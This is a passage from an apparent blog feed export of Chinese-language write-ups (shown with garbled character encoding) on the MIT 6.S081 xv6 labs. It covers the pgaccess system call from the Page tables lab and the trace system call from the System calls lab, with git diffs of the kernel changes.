å…¨éƒ½è®¤çœŸå®Œæˆï¼Œå†è¿ç”¨ä¸€äº›ä½è¿ç®—çš„æŠ€å·§ï¼Œæœ¬é¢˜å…¶å®å¹¶ä¸ â€œhardâ€ã€‚</p><p>æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨éœ€è¦çš„å£°æ˜å·²ç»å®ç°æ·»åŠ å¥½äº†ï¼Œæˆ‘ä»¬åªéœ€è¦å…³æ³¨ <code>sys_pgaccess()</code> çš„å®ç°å³å¯ï¼ŒåŸºæœ¬æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>å’Œ Lab System calls ä¸€æ ·ï¼Œä½¿ç”¨ <code>argint()</code> å’Œ <code>argaddr()</code> è·å–ç”¨æˆ·ç©ºé—´ä¼ é€’çš„å‚æ•°ï¼š<code>base</code>ã€<code>len</code>ã€<code>mask</code>ã€‚</li><li>å‡½æ•°ä½“å†…å®šä¹‰ä¸€ä¸ª <code>kmask</code>ï¼Œä½œä¸º <code>mask</code> çš„ç¼“å†²åŒºã€‚</li><li>ä»åœ°å€ <code>base</code> å¼€å§‹éå†è¿ç»­çš„ <code>len</code> çš„é¡µé¢ï¼Œè·å–è¯¥é¡µé¢çš„é¡µè¡¨é¡¹ <code>pte</code>ï¼Œæ ¹æ® <code>pte</code> çš„è®¿é—®ä½å¯¹ <code>kmask</code> è¿›è¡Œç½®ä½ï¼Œæ³¨æ„ä¸è¦å¿˜äº†æ¯æ¬¡éå†åå°† <code>pte</code> çš„è®¿é—®ä½ç½® 0ã€‚</li><li>éå†å®Œæˆåï¼Œä½¿ç”¨ <code>copyout()</code> å°† <code>kmask</code> çš„æ•°æ®å­˜å…¥ç”¨æˆ·ç©ºé—´ <code>mask</code> å¤„ã€‚</li></ol><p>æœ‰ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„é—®é¢˜ï¼Œæ ¹æ®æç¤ºï¼š</p><blockquote><p>Itâ€™s okay to set an upper limit on the number of pages that can be scanned.</p></blockquote><p>å¯ä»¥è®¾å®šä¸€ä¸ªæœ€å¤§æ‰«æèŒƒå›´ï¼Œè¿™ä¸»è¦æ ¹æ® <code>kmask</code> çš„æ•°æ®ç±»å‹è€Œå®šï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ä½¿ç”¨ <code>long</code> ç±»å‹ï¼Œé‚£ä¹ˆæœ€å¤§æ‰«æèŒƒå›´è‡ªç„¶å°±æ˜¯ 64ï¼ˆ<code>long</code> ç±»å‹ä¸º 8 å­—èŠ‚å¤§å°ï¼Œ64 bitï¼‰ã€‚</p><p>åŒæ—¶ï¼Œåœ¨å¯¹ <code>kmask</code> æ“ä½œæ—¶ï¼Œå¯ä»¥è¿ç”¨ä¸€äº›ä½è¿ç®—çš„æŠ€å·§ï¼š</p><p>é¦–å…ˆå¯ä»¥å°† <code>kmask</code> ç½®ä¸º 0ï¼ˆäºŒè¿›åˆ¶ä½å…¨ä¸º 0ï¼‰ï¼Œå¦‚æœé¡µé¢ i çš„è®¿é—®ä½ä¸º 1ï¼Œåˆ™ä½¿ç”¨ <code>kmask |= (1 &lt;&lt; i)</code>ï¼Œå°† <code>kmask</code> ç¬¬ i ä½ç½®ä¸º 1 è€Œä¸å½±å“å…¶å®ƒä½ï¼ˆ<code>0 | 0 = 0; 1 | 0 = 1</code>ï¼‰ã€‚</p><p>è¦æ¸…é™¤ <code>pte</code> çš„è®¿é—®ä½ï¼Œå¯ä½¿ç”¨ <code>*pte &amp;= ~PTE_A</code>ï¼Œå…¶ä¸­ <code>PTE_A = 1L &lt;&lt; 6</code>ï¼Œå³è®¿é—®ä½ä¸º 1ï¼Œå…¶å®ƒä½éƒ½ä¸º 0ï¼Œå–ååï¼Œè®¿é—®ä½ä¸º 0ï¼Œå…¶å®ƒä½éƒ½ä¸º 1ï¼Œä¸å…¶è¿›è¡ŒæŒ‰ä½ä¸è¿ç®—å¯å°†è®¿é—®ä½ç½®ä¸º 0ï¼Œè€Œä¸å½±å“å…¶å®ƒä½ï¼ˆ<code>0 &amp; 1 = 0; 1 &amp; 1 = 1</code>ï¼‰ã€‚</p><h2 id="é—®é¢˜-1"><a href="#é—®é¢˜-1" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p><strong>é—®é¢˜ 1ï¼š</strong></p><p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/walk.png"></p><p><strong>åŸå› ï¼š</strong> æ¯”è¾ƒå‘çš„ä¸€ä¸ªé—®é¢˜ï¼ŒåŸå› æ˜¯ <code>kernel/defs.h</code> ä¸­æ²¡æœ‰ <code>walk</code> å‡½æ•°å£°æ˜ï¼Œéœ€è¦æ‰‹åŠ¨æ·»åŠ ã€‚</p><h2 id="ä»£ç -2"><a href="#ä»£ç -2" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.hindex d169300..53f1f88 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -171,6 +171,7 @@ int             copyout(pagetable_t, uint64, char *, uint64);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">void            vmprint(pagetable_t); // here</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pte_t *walk(pagetable_t, uint64, int);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// plic.c</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);</span></span>diff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..6b130fe 100644<span class="token coord">--- a/kernel/riscv.h</span><span class="token coord">+++ b/kernel/riscv.h</span>@@ -343,6 +343,7 @@ sfence_vma()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define PTE_W (1L &lt;&lt; 2)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_X (1L &lt;&lt; 3)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_U (1L &lt;&lt; 4) // 1 -> user can access</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PTE_A (1L &lt;&lt; 6) // access bit</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// shift a physical address to the right place for a PTE.</span><span class="token prefix unchanged"> </span><span class="token line">#define PA2PTE(pa) ((((uint64)pa) >> 12) &lt;&lt; 10)</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.cindex 3bd0007..359847c 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -81,6 +81,36 @@ int<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">sys_pgaccess(void)</span><span class="token prefix unchanged"> </span><span class="token line">&#123;</span><span class="token prefix unchanged"> </span><span class="token line">  // lab pgtbl: your code here.</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line">  void *base, *mask;</span><span class="token prefix inserted">+</span><span class="token line">  long kmask; // buffer</span><span class="token prefix inserted">+</span><span class="token line">  int len;</span><span class="token prefix inserted">+</span><span class="token line">  pte_t *pte;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  if (argaddr(0, (uint64 *)&amp;base) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  if (argint(1, &amp;len) &lt; 0 || len > 64) &#123; // page limited to 64</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  if (argaddr(2, (uint64 *)&amp;mask) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  kmask = 0L; // initialize bitmask to zero</span><span class="token prefix inserted">+</span><span class="token line">  for (int i = 0; i &lt; len; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">uint64 va = (uint64)(base + i * PGSIZE);</span><span class="token prefix inserted">+</span><span class="token line">pte = walk(p->pagetable, va, 0);</span><span class="token prefix inserted">+</span><span class="token line">if (*pte &amp; PTE_A) &#123; // pte was accessed recently</span><span class="token prefix inserted">+</span><span class="token line">  kmask |= (1 &lt;&lt; i);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">*pte &amp;= ~PTE_A; // clear access bit</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  if (copyout(p->pagetable, (uint64)mask, (char *)&amp;kmask, 8) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line">#endif</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Speed-up-system-calls&quot;&gt;&lt;a href=&quot;#Speed-up-system-calls&quot; class=&quot;headerlink&quot; title=&quot;Speed up system calls&quot;&gt;&lt;/a&gt;Speed up system calls&lt;/</summary>
      
    
    
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="ç»éªŒ" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab System calls</title>
    <link href="http://lordaeronesz.github.io/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/"/>
    <id>http://lordaeronesz.github.io/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/</id>
    <published>2024-06-27T03:45:11.000Z</published>
    <updated>2024-06-27T03:39:54.186Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xv6ç³»ç»Ÿè°ƒç”¨å®ç°"><a href="#xv6ç³»ç»Ÿè°ƒç”¨å®ç°" class="headerlink" title="xv6ç³»ç»Ÿè°ƒç”¨å®ç°"></a>xv6ç³»ç»Ÿè°ƒç”¨å®ç°</h1><p>ä¸åŒäº Lab1 åˆ©ç”¨å·²å®ç°çš„ç³»ç»Ÿè°ƒç”¨æ¥å®ç°ä¸€äº›ç”¨æˆ·æ€ä¸‹çš„å‘½ä»¤è¡Œç¨‹åºï¼Œæœ¬ Lab æ˜¯è¦åœ¨å†…æ ¸å±‚é¢å®ç°ä¸€äº›ç³»ç»Ÿè°ƒç”¨ã€‚è¿™å…¶ä¸­éš¾å…æ¶‰åŠåˆ°ä¸€äº›å¯¹å†…æ ¸æ•°æ®ç»“æ„çš„æ“ä½œï¼Œä»¥åŠå¤„ç†å™¨ä½“ç³»ç»“æ„ï¼ˆæœ¬ç³»åˆ— Lab åŸºäº RISCVï¼‰ç›¸å…³çš„å†…å®¹ï¼Œé‚£ä¹ˆé¦–å…ˆæœ‰å¿…è¦æ¢³ç†ä¸€ä¸‹ xv6 ä¸‹ç³»ç»Ÿè°ƒç”¨çš„å®ç°è¿‡ç¨‹ã€‚</p><p>xv6 ç³»ç»Ÿè°ƒç”¨çš„å®ç°ï¼š</p><ol><li>ä»¥ <code>trace</code> ç³»ç»Ÿè°ƒç”¨ä¸ºä¾‹ï¼Œç”¨æˆ·é€šè¿‡è°ƒç”¨ <code>user/user.h</code> ä¸­çš„å‡½æ•° <code>trace</code> è¿›è¡Œç³»ç»Ÿè°ƒç”¨ã€‚</li><li>é€šè¿‡è°ƒç”¨ Perl è„šæœ¬ <code>user/usys.pl</code> ç”Ÿæˆçš„ä¸€ç³»åˆ—æ±‡ç¼–ä»£ç ï¼Œè¯¥æ±‡ç¼–ä»£ç çš„ä½œç”¨æ˜¯è®¾ç½®å¯„å­˜å™¨çš„å†…å®¹å¹¶å®ç°ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„åˆ‡æ¢ï¼Œå†…æ ¸åç»­é’ˆå¯¹å¯„å­˜å™¨ä¸­çš„å†…å®¹æ‰§è¡Œç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨æ“ä½œã€‚ä»¥ä¸‹æ˜¯å¯¹ <code>user/usys.pl</code> ä»£ç çš„é€è¡Œè§£æï¼š</li></ol><blockquote><ol><li><p><code>#!/usr/bin/perl -w</code>ï¼šè¿™æ˜¯ä¸€ä¸ªPerlè„šæœ¬çš„â€œshebangâ€è¡Œï¼ŒæŒ‡å®šä½¿ç”¨<code>/usr/bin/perl</code>è§£é‡Šå™¨æ‰§è¡Œæ­¤è„šæœ¬ï¼Œå¹¶å¼€å¯è­¦å‘Šï¼ˆ<code>-w</code>ï¼‰é€‰é¡¹ã€‚</p></li><li><p><code>print &quot;# generated by usys.pl - do not edit\n&quot;;</code>ï¼šæ‰“å°æ³¨é‡Šè¯´æ˜æ­¤æ–‡ä»¶æ˜¯ç”±<code>usys.pl</code>è„šæœ¬è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œä¸åº”æ‰‹åŠ¨ç¼–è¾‘ã€‚</p></li><li><p><code>print &quot;#include \&quot;kernel/syscall.h\&quot;\n&quot;;</code>ï¼šè¾“å‡ºä¸€æ¡é¢„å¤„ç†å™¨æŒ‡ä»¤ï¼ŒåŒ…å«ä¸€ä¸ªåä¸º<code>syscall.h</code>çš„å¤´æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å¯èƒ½åŒ…å«äº†ç³»ç»Ÿè°ƒç”¨ç›¸å…³çš„å¸¸é‡å’Œå®å®šä¹‰ã€‚</p></li><li><p><code>sub entry &#123;...&#125;</code>ï¼šå®šä¹‰äº†ä¸€ä¸ªåä¸º<code>entry</code>çš„å­ç¨‹åºï¼ˆå‡½æ•°ï¼‰ï¼Œå®ƒæ¥å—ä¸€ä¸ªå‚æ•°ï¼ˆç³»ç»Ÿè°ƒç”¨åç§°ï¼‰ã€‚</p></li><li><p><code>my $name = shift;</code>ï¼šåœ¨<code>entry</code>å‡½æ•°å†…éƒ¨ï¼Œä½¿ç”¨<code>shift</code>å‡½æ•°è·å–ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆç³»ç»Ÿè°ƒç”¨åç§°ï¼‰ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨å˜é‡<code>$name</code>ä¸­ã€‚</p></li><li><p>æ¥ä¸‹æ¥çš„å‡ è¡Œ<code>print</code>è¯­å¥æ„é€ äº†æ¯ä¸ªç³»ç»Ÿè°ƒç”¨å­˜æ ¹çš„æ±‡ç¼–ä»£ç ï¼š</p><ul><li><code>.global $name</code>ï¼šå£°æ˜ä¸€ä¸ªå…¨å±€æ ‡ç­¾ï¼ˆå‡½æ•°åï¼‰ï¼Œä½¿å¾—é“¾æ¥å™¨èƒ½å¤Ÿæ‰¾åˆ°å®ƒã€‚</li><li><code>$&#123;name&#125;:\n</code>ï¼šå®šä¹‰äº†ä¸€ä¸ªæ ‡ç­¾ï¼Œå¯¹åº”äºç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„å¼€å§‹ã€‚</li><li><code>li a7, SYS_$&#123;name&#125;\n</code>ï¼šè£…è½½ï¼ˆload immediateï¼‰æŒ‡ä»¤ï¼Œå°†ç³»ç»Ÿè°ƒç”¨å·ï¼ˆé€šè¿‡å®<code>SYS_$&#123;name&#125;</code>å¾—åˆ°ï¼‰æ”¾å…¥å¯„å­˜å™¨a7ä¸­ã€‚åœ¨RISC-Væ¶æ„ä¸­ï¼Œa7å¯„å­˜å™¨é€šå¸¸ç”¨äºå­˜æ”¾ç³»ç»Ÿè°ƒç”¨å·ã€‚</li><li><code>ecall</code>ï¼šæ‰§è¡Œç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤ï¼Œè¿™ä¼šè§¦å‘å¤„ç†å™¨è¿›å…¥å†…æ ¸æ¨¡å¼å¹¶æ‰§è¡Œç›¸åº”çš„å†…æ ¸æœåŠ¡ã€‚</li><li><code>ret</code>ï¼šè¿”å›æŒ‡ä»¤ï¼Œä»ç³»ç»Ÿè°ƒç”¨ä¸­è¿”å›åˆ°ç”¨æˆ·ç¨‹åºã€‚</li></ul></li><li><p>æœ€åï¼Œè„šæœ¬é€šè¿‡å¤šæ¬¡è°ƒç”¨<code>entry</code>å‡½æ•°ï¼ˆä¼ å…¥ä¸åŒçš„ç³»ç»Ÿè°ƒç”¨åç§°ï¼Œå¦‚<code>fork</code>, <code>exit</code>, <code>wait</code>ç­‰ï¼‰ï¼Œä¸ºæ¯ä¸€ä¸ªåˆ—å‡ºçš„ç³»ç»Ÿè°ƒç”¨ç”Ÿæˆå¯¹åº”çš„æ±‡ç¼–ä»£ç å­˜æ ¹ã€‚</p></li></ol></blockquote><ol start="3"><li>å†…æ ¸åœ¨æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œåªæ˜¯è°ƒç”¨ <code>kernel/syscall.c</code> ä¸­çš„ <code>syscall</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°è¯»å–å¯„å­˜å™¨ a7 çš„å€¼ï¼Œå°†å…¶ä½œä¸ºç³»ç»Ÿè°ƒç”¨å·ï¼Œæ‰§è¡Œå®é™…çš„ç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼ˆå¦‚<code>sys_trace</code>ï¼‰ï¼Œå¹¶å°†å‡½æ•°è¿”å›å€¼æ”¾å…¥å¯„å­˜å™¨ a0 ä¸­ï¼Œè°ƒç”¨ç»“æŸã€‚</li></ol><h1 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ç†è§£äº†ä¸Šè¿°çš„ç³»ç»Ÿè°ƒç”¨è¿‡ç¨‹ï¼Œå°±å¯ä»¥å¼€å§‹ç€æ‰‹å®Œæˆç³»ç»Ÿè°ƒç”¨çš„æ·»åŠ äº†ã€‚</p><p>ç”±é¢˜å¹²å¯çŸ¥ï¼Œç”¨æˆ·æ€ç³»ç»Ÿè°ƒç”¨å‡½æ•° <code>trace</code> çš„å‚æ•°ä¸ºä¸€ä¸ªæ•´å‹ maskï¼Œè¯¥ mask ç”¨æ¥è¡¨ç¤ºå“ªäº›ç³»ç»Ÿè°ƒç”¨éœ€è¦è¢«è¿½è¸ªï¼Œå¦‚æœ mask çš„ç¬¬ i ä½ä¸º 1ï¼Œåˆ™ç³»ç»Ÿè°ƒç”¨å· i å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å°†è¢«è¿½è¸ªã€‚</p><p>é¦–å…ˆï¼Œåœ¨ <code>user/user.h</code>ã€<code>user/usys.pl</code> å’Œ <code>kernel/syscall.h</code> ä¸­æ·»åŠ  <code>trace</code> çš„å£°æ˜ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œåœ¨ <code>kernel/sysproc.c</code> ä¸­å®ç°ç³»ç»Ÿè°ƒç”¨å‡½æ•° <code>sys_trace</code>ï¼Œè¯¥å‡½æ•°è·å–ç”¨æˆ·æ€ä¼ é€’çš„ <code>trace</code> å‡½æ•°çš„å‚æ•° maskï¼Œå¹¶å­˜å…¥å½“å‰è¿›ç¨‹çš„ PCBï¼ˆè¿›ç¨‹æ§åˆ¶å—ï¼Œxv6 ä¸­ä¸º <code>kernel/proc.h</code> ä¸­çš„ <code>struct proc</code> ç»“æ„ä½“ï¼‰ä¸­ã€‚è·å–å‚æ•°çš„æ“ä½œï¼Œå¯ä»¥æŸ¥çœ‹å¦‚ä¸‹ xv6 æ–‡æ¡£çš„æè¿°ï¼Œå¹¶å‚è€ƒ <code>kernel/sysproc.c</code> ä¸­å…¶å®ƒç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„å®ç°ã€‚ç”±äºå‚æ•°ç±»å‹ä¸ºæ•´å‹ä¸”æ•°é‡åªæœ‰ä¸€ä¸ªï¼ˆå­˜æ”¾åœ¨ a0 å¯„å­˜å™¨ä¸­ï¼‰ï¼Œå› æ­¤è°ƒç”¨ <code>argint(0, &amp;(myproc()-&gt;mask))</code>ã€‚å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>struct proc</code> çš„åˆå§‹å®šä¹‰ä¸­å¹¶æ²¡æœ‰ mask æ®µçš„å†…å®¹ï¼Œéœ€è¦è‡ªè¡Œæ·»åŠ ã€‚</p><blockquote><p>Because user code calls system call wrapper functions, the arguments are initially where the RISC-V C calling convention places them: in registers. The kernel trap code saves user registers to the current processâ€™s trap frame, where kernel code can find them. The kernel functions argint, argaddr, and argfd retrieve the n â€™th system call argument from the trap frame as an integer, pointer, or a file descriptor. They all call argraw to retrieve the appropriate saved user register (kernel/syscall.c:35).</p></blockquote><p>ç„¶åï¼Œä¿®æ”¹ <code>kernel/proc.c</code> ä¸­ <code>fork</code> å‡½æ•°çš„å®šä¹‰ï¼Œä¸º mask å­—æ®µæ·»åŠ æ‹·è´æ“ä½œï¼Œå°†çˆ¶è¿›ç¨‹çš„ mask å­—æ®µä¼ é€’ç»™å­è¿›ç¨‹ï¼Œä»¥æ­¤å®ç°å¯¹å­è¿›ç¨‹çš„è¿½è¸ªã€‚</p><pre class="language-c" data-language="c"><code class="language-c">np<span class="token operator">-></span>mask <span class="token operator">=</span> p<span class="token operator">-></span>mask<span class="token punctuation">;</span></code></pre><p>æœ€åï¼Œä¿®æ”¹ <code>kernel/syscall.c</code> ä¸­çš„ <code>syscall</code> å‡½æ•°ï¼Œåˆ¤æ–­å½“å‰çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯å¦ä½äºè¢«è¿½è¸ªçš„èŒƒå›´å†…ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™æŒ‰ç…§è¦æ±‚æ ¼å¼å°†è¦è¿½è¸ªçš„ä¿¡æ¯æ‰“å°å‡ºæ¥ï¼šå…¶ä¸­è¿›ç¨‹å·ä¸º <code>myproc()-&gt;pid</code>ï¼›å‡½æ•°è°ƒç”¨åå¯æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªç³»ç»Ÿè°ƒç”¨åç§°è¡¨ï¼Œé€šè¿‡å°†ç³»ç»Ÿè°ƒç”¨å·ä½œä¸ºä¸‹æ ‡æ¥è·å–ï¼›å‡½æ•°è¿”å›å€¼ä½äºå¯„å­˜å™¨ a0 ä¸­ï¼Œå¯é€šè¿‡ <code>myproc()-&gt;trapframe-&gt;a0</code> æ¥è·å–ã€‚</p><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>æœ€åå†è®°å½•ä¸€ä¸‹æœ¬ Lab é‡åˆ°çš„ä¸€äº›é—®é¢˜ï¼š</p><h3 id="makeå¤±è´¥"><a href="#makeå¤±è´¥" class="headerlink" title="makeå¤±è´¥"></a>makeå¤±è´¥</h3><p><img src="/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/mkerr.png"></p><p>è¢«è¿™ä¸ªé”™è¯¯å›°æ‰°äº†æŒºä¹…ï¼Œç”šè‡³è¿˜ä¸ºæ­¤ä½¿ç”¨ <code>git reset</code> å›é€€äº†ç‰ˆæœ¬ï¼Œæœ€åå‘ç°æ˜¯åœ¨ <code>$U/_trace\</code> çš„æœ«å°¾å¤šäº†ä¸€ä¸ªç©ºæ ¼ã€‚ã€‚ã€‚</p><h3 id="ç³»ç»Ÿè°ƒç”¨åç§°è¡¨æ·»åŠ å‡ºé”™"><a href="#ç³»ç»Ÿè°ƒç”¨åç§°è¡¨æ·»åŠ å‡ºé”™" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨åç§°è¡¨æ·»åŠ å‡ºé”™"></a>ç³»ç»Ÿè°ƒç”¨åç§°è¡¨æ·»åŠ å‡ºé”™</h3><p><img src="/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/aserr.png"></p><p>åŸå› æ˜¯æˆ‘å°†ç³»ç»Ÿè°ƒç”¨åç§°è¡¨æ·»åŠ åœ¨äº† <code>kernel/syscall.h</code> ä¸­ï¼Œä½†è¯¥å¤´æ–‡ä»¶åç»­æ˜¯ä¼šè¢« <code>user/usys.pl</code> ç”¨äºç”Ÿæˆæ±‡ç¼–çš„ï¼Œå› æ­¤ä¸èƒ½åŒ…å« C è¯­è¨€è¯­å¥ï¼Œæœ€åæ˜¯é€‰æ‹©ç›´æ¥æ·»åŠ åœ¨äº† <code>kernel/syscall.c</code> ä¸­ã€‚</p><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><p>ç”±äºæœ¬ Lab ä¸»è¦æ˜¯åœ¨åŸå…ˆçš„å†…æ ¸ä»£ç ä¸Šè¿›è¡Œä¿®æ”¹ï¼Œæ¶‰åŠçš„æ–‡ä»¶è¾ƒå¤šï¼Œå› æ­¤ä»£ç éƒ¨åˆ†ä»¥ <code>git diff</code> çš„å½¢å¼å±•ç°ã€‚</p><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex c926b7e..6647da5 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -193,6 +193,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_grind\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_trace\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..f4bd5c2 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -314,6 +314,9 @@ fork(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  acquire(&amp;np->lock);</span><span class="token prefix unchanged"> </span><span class="token line">  np->state = RUNNABLE;</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;np->lock);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  np->mask = p->mask;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  return pid;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..e83d456 100644<span class="token coord">--- a/kernel/proc.h</span><span class="token coord">+++ b/kernel/proc.h</span>@@ -105,4 +105,7 @@ struct proc &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  int mask;   // Mask of trace</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..b5b8291 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -104,6 +104,7 @@ extern uint64 sys_unlink(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_trace(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -127,6 +128,16 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_trace]   sys_trace,</span><span class="token prefix inserted">+</span><span class="token line">&#125;;</span><span class="token prefix 